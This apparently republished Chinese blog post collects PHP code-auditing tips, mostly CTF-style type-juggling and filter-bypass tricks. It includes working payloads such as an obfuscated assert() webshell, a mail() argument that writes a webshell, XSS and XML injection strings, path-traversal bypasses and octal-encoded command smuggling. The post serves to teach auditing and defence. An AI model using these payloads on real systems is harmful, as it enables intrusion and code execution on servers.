## PHP代码审计中的一些Tips

来源：[http://zeroyu.xyz/2018/10/13/php-audit-tips/](http://zeroyu.xyz/2018/10/13/php-audit-tips/)

时间 2018-10-13 20:00:14


此函数可以被%00截断

比如下面这个例子，可以使用$b=”%001111”

```php
//%00好像算一个字节
if(strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
    require("f4l2a3g.txt");
}


```


#### 2.assert  

PHP中的assert可以用来执行PHP函数，进而进行getshell等操作，比如我们利用如下代码进行目录扫描

```php
<?php 
$poc = "a#s#s#e#r#t";
$poc_1 = explode("#", $poc);$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];
$poc_2($_GET['s'])
?>


```

payload`s=print_r(scandir('./'));`#### 3.md5&sha1  

PHP中的md5和sha1函数存在两个问题，第一是他们处理数组都返回null；第二在弱类型条件下他们会认为如下的返回值相同

```php
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
sha1('aaroZmOk')  
sha1('aaK1STfY')
sha1('aaO8zKZF')
sha1('aa3OFF9m')


```

注意：如果使用了md5并且是强相等，那么找到数据对应md5相同的值即可，在此给出一组某强网杯使用过的数据

```php
$Param1="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
$Param2="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
#008ee33a9d58b51cfeb425b0959121c9


```

此外我们观察定义可以得到另外一点，通过设置raw_output参数的值为true，我们可以达到一个\，从而进行sql注入

```php
string md5 ( string $str [, bool $raw_output = false ] )
str 原始字符串。
raw_output 如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。


```

```php
php > var_dump(md5(128,true));
string(16) "v�an���l���q��\"


```


#### 4.strcmp  

注：5.3之前版本的php存在如下问题

当这个函数接受到了不符合的类型，这个函数将发生错误并返回0，因而可以使用数组绕过验证

```php
<?php
$flag = "flag{xxxxx}";
if (isset($_GET['a'])) {
if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。
//比较两个字符串（区分大小写）
die('Flag: '.$flag);
else
print 'No';
}
?>


```


#### 5.ereg  

ereg()函数只能处理字符，如果传入数组将返回null


#### 6.strpos  

strpos()的参数不能够是数组，所以处理数组返回的是null

strpos()与PHP的自动类型转换结合也会出在哪问题

如下：

```php
var_dump(strpos('abcd','a'));       # 0
var_dump(strpos('abcd','x'));       # false


```

并且由于PHP的自动类型转换的关系，0和false是相等的

```php
var_dump(0==false);         # true


```

例题：

```php
class Login {
    public function __construct($user, $pass) {
        $this->loginViaXml($user, $pass);
    }

    public function loginViaXml($user, $pass) {
        if (
            (!strpos($user, '<') || !strpos($user, '>')) &&
            (!strpos($pass, '<') || !strpos($pass, '>'))
        ) {
            $format = '<xml><user="%s"/><pass="%s"/></xml>';
            $xml = sprintf($format, $user, $pass);
            $xmlElement = new SimpleXMLElement($xml);
            // Perform the actual login.
            $this->login($xmlElement);
        }
    }
}

new Login($_POST['username'], $_POST['password']);


```

传入的username和password的首位字符是<或者是>就可以绕过限制，那么最后的pyaload就是：

```php
username=<"><injected-tag%20property="&password=<"><injected-tag%20property="


```

最终传入到$this->login($xmlElement)的$xmlElement值是`<xml><user="<"><injected-tag property=""/><pass="<"><injected-tag property=""/></xml>`这样就可以进行注入了。


#### 7.is_numeric  

is_numeric()函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。


#### 8.ord  

ord()函数返回字符串的首个字符的 ASCII 值

例如下面这道题目，我们可以用16进制绕过限制

```php
<?php
error_reporting(0);
function noother_says_correct($temp)
{
$flag = 'flag{test}';
$one = ord('1'); //ord — 返回字符的 ASCII 码值
$nine = ord('9'); //ord — 返回字符的 ASCII 码值
$number = '3735929054';
// Check all the input characters!
for ($i = 0; $i < strlen($number); $i++)
{
// Disallow all the digits!
$digit = ord($temp{$i});
if ( ($digit >= $one) && ($digit <= $nine) )
{
// Aha, digit not allowed!
return "flase";
}
}
if($number == $temp)
return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);
?>


```


#### 9.科学计数法  

```php
strlen($_GET['password']) < 8 && $_GET['password'] > 9999999

payload==>1e9


```


#### 10.in_array  

语法：in_array(search,array,type)

| 参数 | 描述 |
| - | - |
| search | 必需。规定要在数组搜索的值。 |
| array | 必需。规定要搜索的数组。 |
| type | 可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。 |
  

注意：in_array()的第三个参数在默认情况下是false，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。

例如如下代码在13 行存在任意文件上传漏洞。 在 12 行代码通过`in_array()`来判断文件名是否为整数，可是未将`in_array()`的第三个参数设置为 true 。`in_array()`的第三个参数在默认情况下是false，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。比如使用文件名为 5vulnspy.php 的文件将可以成功通过`in_array($this->file['name'], $this->whitelist)`判断，从而将恶意的 PHP 文件上传到服务器。

```php
class Challenge {
    const UPLOAD_DIRECTORY = './solutions/';
    private $file;
    private $whitelist;

    public function __construct($file) {
        $this->file = $file;
        $this->whitelist = range(1, 24);
    }

    public function __destruct() {
        if (in_array($this->file['name'], $this->whitelist)) {
            move_uploaded_file(
                $this->file['tmp'],
                self::UPLOAD_DIRECTORY . $this->file['name']
            );
        }
    }
}

$challenge = new Challenge($_FILES['solution']);


```

测试

```php
$myarray = range(1,24); 
in_array('5vulnspy.php',$myarray);         //true
in_array('5vulnspy.php',$myarray,true);    //false


```


#### 11.filter_var  

filter_var()的URL过滤非常的弱，只是单纯的从形式上检测并没有检测协议。测试如下：

```php
var_dump(filter_var('vulnspy.com', FILTER_VALIDATE_URL));           # false
var_dump(filter_var('http://vulnspy.com', FILTER_VALIDATE_URL));    # http://vulnspy.com
var_dump(filter_var('xxxx://vulnspy.com', FILTER_VALIDATE_URL));    # xxxx://vulnspy.com
var_dump(filter_var('http://vulnspy.com>', FILTER_VALIDATE_URL));   # false


```

这种情况下可以采用如下payload`javascript://comment%250aalert(1)`来触发XSS

注：%250a即%0a表示换行符，上面的payload会被换行，并且//表示注释。最终触发后将得到如下形式

```php
javascript://comment
alert(1)


```


#### 12.class_exist  

以class_exist()为例的下列函数会在在PHP 5.4以下版本中存在任意文件包含漏洞

```php
call_user_func()
call_user_func_array()
class_exists()
class_implements()
class_parents()
class_uses()
get_class_methods()
get_class_vars()
get_parent_class()
interface_exists()
is_a()
is_callable()
is_subclass_of()
method_exists()
property_exists()
spl_autoload_call()
trait_exists()


```

注：class_exists()会检查是否存在对应的类，当调用class_exists()函数时会触发用户定义的autoload()函数，用于加载找不到的类。所以如果我们输入../../../../etc/passwd是，就会调用class_exists()，这样就会触发 autoload(),这样就是一个任意文件包含的漏洞了。

此外，还存在一个blind xxe的漏洞，由于存在class_exists()，所以我们可以调用PHP的内置函数,并且通过$controller = new $controllerName($data);进行实例化。借助与PHP中的SimpleXMLElement类来完成XXE攻击。

xxe漏洞实例参考：

[shopware blind xxe][0]

[我是如何黑掉“Pornhub”来寻求乐趣和赢得10000$的奖金][1]

  
参考：

    [stackoverflow:class_exists&autoload：][2]
  


#### 13.mail  

mail()中的第五个参数可以-X的方式写入webshell。

payload：`example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php`这个PoC的功能是在Web目录中生成一个PHP webshell。该文件（rce.php）包含受到PHP代码污染的日志信息

escapeshellarg()和filter_var()不安全的问题参考    [在PHP应用程序开发中不正当使用mail()函数引发的血案][3]

escapeshellarg和escapeshellcmd联合使用从而造成的安全问题参考    [PHP escapeshellarg()+escapeshellcmd() 之殇][4]


#### 14.正则表达式可能存在问题  


(1)

如本意想将非a-z、.、-、 全部替换为空，但是正则表达式写成了`[^a-z.- ]`，其中没有对-进行转义，那么-表示一个列表，例如[1-9]表示的数字1到9，但是如果[1-9]表示就是字母1、-和9。所以[^a-z.-_]表示的就是非ascii表中的序号为46至122的字母替换为空。那么此时的../…/就不会被匹配，就可以进行目录穿越，从而造成任意文件删除了。

(2)在反序列化漏洞中对于`preg_match('/O:\d:/', $data)`这样的正则可以采用在对象长度前添加一个+号，即o:14->o:+14来进行绕过。

参考：    [php反序列unserialize的一个小特性][5]


#### 15.parse_str  

parse_str()可以在参数可控的情况下可以造成变量覆盖漏洞

例如：

```php
$var = parse_url($_SERVER['HTTP_REFERER']);
parse_str($var['query']);


```


#### 16.preg_replace  

preg_replace() /e 模式可以执行任意代码，例子如下

```php
header("Content-Type: text/plain");

function complexStrtolower($regex, $value) {
    return preg_replace(
        '/(' . $regex . ')/ei',
        'strtolower("\\1")',
        $value
    );
}

foreach ($_GET as $regex => $value) {
    echo complexStrtolower($regex, $value) . "\n";
}


```

preg_replace的参数含义参考    [PHP手册–preg_replace][6]

在此处我们可以看到有两处的值是我们可以操控的，但是只有在’strtolower(“\1”)’这个位置的参数才可以执行代码，所以关键就在这儿。 \1是具有特殊含义的，在这儿就是就是指定第一个子匹配项,也即${phpinfo()}，进而达到执行代码的目的

参考文章：

[深入研究preg_replace与代码执行][7]

[后向引用][8]

[一个PHP正则相关的“经典漏洞”][9]


#### 17.str_replace  

str_replace()函数是单次替换而不是多次替换，因而可以通过双写敏感词汇过滤，例如：

```php
str_replace('../', '', $language);
//payload:..././或者....//


```


#### 18.header  

使用header()进行跳转的时候没有使用exit()或者是die()，导致后续的代码任然可以执行。如果后面存在危险函数，那么将会触发漏洞。

例如：

```php
extract($_POST);

function goAway() {
    error_log("Hacking attempt.");
    header('Location: /error/');
}

if (!isset($pi) || !is_numeric($pi)) {
    goAway();
}

if (!assert("(int)$pi == 3")) {
    echo "This is not pi.";
} else {
    echo "This might be pi.";
}


```

此处就可以POST一个`pi=phpinfo()`来借助assert()函数触发代码执行漏洞


#### 19.intval  

intval()函数执行成功时返回 变量的10进制值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。


#### 20.htmlentities  

htmlentities默认情况下不会对单引号进行转义。


#### 21.addslashes  

在进行了addslashes之后进行了截断，在一些情况下就有可能能够获得一个引号。

比如：

```php
function sanitizeInput($input, $length = 20) {
    $input = addslashes($input);
    if (strlen($input) > $length) {
        $input = substr($input, 0, $length);
    }
    return $input;
}
$test = "1234567890123456789'";
var_dump(sanitizeInput($test));

//output:1234567890123456789\


```

此处输出的刚好是带有一个\，而’则因为长度限制被截断，从而可以出发SQL注入漏洞


#### 22.小特性  

(1)php自身在解析请求的时候，如果参数名字中包含空格、.、[这几个字符，会将他们转换成_。但是通过`$_SERVER['REQUEST_URI']`方式获得的参数并不会进行转换。

参考：

[request导致的安全性问题分析][10]

[PHP的两个特性导致waf绕过注入][11]

(2)PHP中的`""`是可以执行代码的，因而在payload中常采用`"<?php phpinfo();>"`#### 23. ++  

PHP中的自增符号++在如下情况中不会有任何意义

```php
$test=123; echo $test++;  # 123


```

因此像下面代码所示的一样，就可能回产生变量覆盖漏洞

```php
foreach ($input as $field => $count) {
    $this->$field = $count++;
}
//这里的$count++在此并没有立即对值进行了修改


```

提示：当然如果++$count形式的话，也是可以存在变量覆盖的，因为在进行++操作时会进行隐式类型转换，如果能够转换成功，则会进行加法操作；如果不能转换成功，则将最后一个字符进行加法操作。

示例：

```php
$test = 123; echo ++$test;      // 124
$test = '123'; echo ++$test;    // 124
$test = '1ab'; echo ++$test;    // '1ac'
$test = 'ab1'; echo ++$test;    // 'ab2'
$test = 'a1b'; echo ++$test;    // 'a1c'
$test =array(2,'name'=>'wyj'); echo ++$test;    //Array123

//所以我们构造shell.php4或者shell.pho这样的，在自增操作后就会变成我们想要的shell.php5或者shell.php


```


#### 24.openssl_verify  

依据openssl_verify()的定义有

如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1.

如果单独采用如下形式的判断就会出现问题，因为if判断只有遇到0或者是false返回的才是false。

```php
if (openssl_verify($data, $signature, $pub)) {
    $object = json_decode(base64_decode($data));
    $this->loginAsUser($object);
}


```


#### 25.stripcslashes  

stripcslashes函数

返回反转义后的字符串。可识别类似 C 语言的 \n，\r，… 八进制以及十六进制的描述。

```php
var_dump(stripcslashes('0\073\163\154\145\145\160\0405\073'));      // 0;sleep 5;


```

因而对于下面这种形式我们可以采用将命令转换为八进制的形式进行绕过正则判断并触发命令执行

```php
function createThumbnail() {
    $e = stripcslashes(
        preg_replace(
            '/[^0-9\\\]/',
            '',
            isset($_GET['size']) ? $_GET['size'] : '25'
        )
    );
    system("/usr/bin/convert {$this->file} --resize $e
            ./thumbs/{$this->file}");
}


```


#### 26.set_error_handler  

若错误配置此函数，将会造成信息泄露进而造成漏洞产生，比如：

```php
set_error_handler(function ($no, $str, $file, $line) {
    throw new ErrorException($str, 0, $no, $file, $line);
}, E_ALL);


```

这里的设置就相当于

```php
error_reporting(E_ALL);
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);


```

这种配置将会泄露所有的错误信息


#### 27.declare与array_walk  

针对PHP7版本

PHP7中引入了declare(strict_types=1);这种声明方式，在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用。

```php
declare(strict_types=1);
function addnum(int $a,int $b) {
    return $a+$b;
}
$result = addnum(1,2);
var_dump($result);              // 输出3
$result = addnum('1','2');
var_dump($result);              //出现Fatal error: Uncaught TypeError，Argument 1 passed to addnum() must be of the type integer, string given,程序出错，参数的数据类型不匹配


```

但是通过array_walk()调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数。

```php
declare(strict_types=1);
function addnum(int &$value) {
    $value = $value+1;
}
$input = array('3a','4b');
array_walk($input,addnum);
var_dump($input);//array(4,5)


```

因此利用array_walk()的这种特性，我们可以传入任意字符进去，进而触发相应的漏洞。


#### 28.ldap_escape  

  
  
#### string ldap_escape ( string $value [, string $ignore [, int $flags ]] )

  
#### value

The value to escape.

  
#### ignore

Characters to ignore when escaping.

  
#### flags

The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs.


当使用ldap_search()时需要选择LDAP_ESCAPE_FILTER过滤字符串，但是如果选择LDAP_ESCAPE_DN将会导致过滤无效


[0]: https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/
[1]: http://bobao.360.cn/learning/detail/3082.html
[2]: https://stackoverflow.com/questions/3812851/there-is-a-way-to-use-class-exists-and-autoload-without-crash-the-script
[3]: https://www.anquanke.com/post/id/86015
[4]: https://paper.seebug.org/164/#
[5]: http://www.phpbug.cn/archives/32.html
[6]: http://php.net/manual/zh/function.preg-replace.php
[7]: https://xz.aliyun.com/t/2557
[8]: http://php.net/manual/zh/regexp.reference.back-references.php
[9]: https://www.cdxy.me/?p=756
[10]: https://blog.spoock.com/2018/05/05/request-vuln-analysis/
[11]: https://blog.csdn.net/u011721501/article/details/51824576